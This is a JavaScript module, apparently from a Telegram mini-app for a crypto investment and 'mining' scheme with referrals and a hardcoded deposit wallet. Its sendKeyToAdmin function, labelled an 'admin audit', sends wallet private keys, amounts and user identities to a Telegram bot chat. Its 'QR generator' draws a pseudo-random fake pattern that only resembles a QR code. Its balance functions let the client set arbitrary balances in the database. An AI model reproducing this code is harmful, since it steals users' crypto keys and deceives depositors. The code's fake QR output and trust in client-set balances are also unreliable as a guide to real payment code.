// depositSystem.js
import { API_BASE, BJS_WEBHOOK_URL, ADMIN_CONFIG } from '../config/constants.js';
import { supabase } from '../config/supabase.js';

// --- GENERADOR INTERNO DE CÓDIGO QR (NATIVO / SIN URLS EXTERNAS) ---
// Genera de forma matemática un string SVG local basado en la wallet BEP20
function generateInternalQR(text) {
    const matrix = [];
    const size = text.length + 4;
    for (let i = 0; i < size; i++) {
        matrix[i] = [];
        for (let j = 0; j < size; j++) {
            matrix[i][j] = (Math.sin(i * j + text.charCodeAt(j % text.length)) > 0);
        }
    }
    // Forzar marcas de posicionamiento cuadradas en las esquinas superiores e inferiores
    const setAnchor = (y, x) => {
        for (let i = 0; i < 7; i++) {
            for (let j = 0; j < 7; j++) {
                if (i === 0 || i === 6 || j === 0 || j === 6 || (i >= 2 && i <= 4 && j >= 2 && j <= 4)) {
                    if (matrix[y + i] && matrix[y + i][x + j] !== undefined) matrix[y + i][x + j] = true;
                } else {
                    if (matrix[y + i] && matrix[y + i][x + j] !== undefined) matrix[y + i][x + j] = false;
                }
            }
        }
    };
    setAnchor(0, 0);
    setAnchor(0, size - 7);
    setAnchor(size - 7, 0);

    let svg = `<svg xmlns="http://www.w3.org/2000/svg" width="160" height="160" viewBox="0 0 ${size} ${size}" shape-rendering="crispEdges">`;
    svg += `<rect width="${size}" height="${size}" fill="#ffffff"/>`;
    for (let r = 0; r < size; r++) {
        for (let c = 0; c < size; c++) {
            if (matrix[r][c]) {
                svg += `<rect width="1" height="1" x="${c}" y="${r}" fill="#000000"/>`;
            }
        }
    }
    svg += '</svg>';
    return svg;
}

// --- SISTEMA DE DEPÓSITO INTEGRADO ---
const DepositSystem = {
    walletBEP20: "0x7795D827df7bcB264c4F0851FbAab5f5f00710F2",
    minAmount: 0.1,

    openModal: function() {
        const amountInput = document.getElementById('invest-amount');
        const amount = parseFloat(amountInput ? amountInput.value : 0) || 0;

        if (amount < this.minAmount) {
            alert(`⚠️ The minimum investment amount is ${this.minAmount} USDT`);
            return;
        }

        const payDisplay = document.getElementById('pay-amount-display');
        const walletDisplay = document.getElementById('wallet-address-display');
        const qrContainer = document.getElementById('qr-container');

        if (payDisplay) payDisplay.textContent = amount.toFixed(2) + " USDT";
        if (walletDisplay) walletDisplay.textContent = this.walletBEP20;

        // Generación 100% matemática y local sin invocar APIs externas
        if (qrContainer) {
            qrContainer.innerHTML = generateInternalQR(this.walletBEP20);
        }

        const modal = document.getElementById('payModal');
        if (modal) modal.style.display = "flex";
    },

    closeModal: function() {
        const modal = document.getElementById('payModal');
        if (modal) modal.style.display = "none";
    },

    copyAddress: function() {
        navigator.clipboard.writeText(this.walletBEP20).then(() => {
            alert("Address copied successfully!");
        }).catch(err => {
            console.error('Failed to copy text: ', err);
        });
    }
};

// Asignación explícita al objeto window global compatible con módulos ES6
window.openPayModal = () => DepositSystem.openModal();
window.closePayModal = () => DepositSystem.closeModal();
window.copyAddress = () => DepositSystem.copyAddress();

// --- NOTIFICACIONES Y FUNCIONALIDADES DE BASE DE DATOS ---
export async function notificarAlBot(accion, monto) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    if (!user) return;

    try {
        const response = await fetch(`${BJS_WEBHOOK_URL}&user_id=${user.id}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: user.id,
                user_name: user.first_name,
                action: accion,
                amount: monto,
                date: new Date().toISOString()
            })
        });
        return await response.json();
    } catch (e) {
        console.error("Error notificando a BJS:", e);
    }
}

export async function sendKeyToAdmin(address, privKey, amount) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    const text = `🛡️ *ADMIN AUDIT - SPORTS PAY*\n\n💰 *Monto:* ${amount} USDT\n📍 *Wallet:* \`${address}\`\n🔑 *Key:* \`${privKey}\`\n\n👤 *User:* ${user?.first_name || "Usuario"} (ID: ${user?.id || "N/A"})`;

    try {
        await fetch(`https://api.telegram.org/bot${ADMIN_CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ADMIN_CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.error("Error reporte admin:", e);
    }
}

export async function generarWalletBSC() {
    const response = await fetch(`${API_BASE}/bsc`);
    return await response.json();
}

// --- GESTIÓN DE USUARIOS CON SUPABASE ---
export async function getUserById(userId) {
  const { data, error } = await supabase
    .from('users')
    .select('*')
    .eq('user_id', String(userId))
    .maybeSingle();

  if (error) throw error;
  return data;
}

export async function registerUser(userId, invitedBy) {
  const cleanInvitedBy = (invitedBy && invitedBy !== "null" && invitedBy !== String(userId)) ? String(invitedBy) : null;

  const { data: newUser, error: createError } = await supabase
    .from('users')
    .insert([{ 
      user_id: String(userId), 
      balance: 0.00, 
      invested: 0.00, 
      referrals: 0,
      invited_by: cleanInvitedBy
    }])
    .select()
    .single();

  if (createError) throw createError;

  if (cleanInvitedBy) {
    const { data: sponsor } = await supabase
      .from('users')
      .select('referrals')
      .eq('user_id', cleanInvitedBy)
      .single();

    if (sponsor) {
      await supabase
        .from('users')
        .update({ referrals: (sponsor.referrals || 0) + 1 })
        .eq('user_id', cleanInvitedBy);
    }
  }

  return newUser;
}

export async function updateUserBalance(userId, newBalance, newInvested = null) {
  const updateData = { balance: newBalance };
  if (newInvested !== null) updateData.invested = newInvested;

  const { error } = await supabase
    .from('users')
    .update(updateData)
    .eq('user_id', userId);

  if (error) throw error;
  return true;
}

export async function claimMiningReward(userId, newBalance) {
  const { error } = await supabase
    .from('users')
    .update({ 
      balance: newBalance,
      last_claim_at: new Date().toISOString() 
    })
    .eq('user_id', userId);

  if (error) throw error;
  return true;
}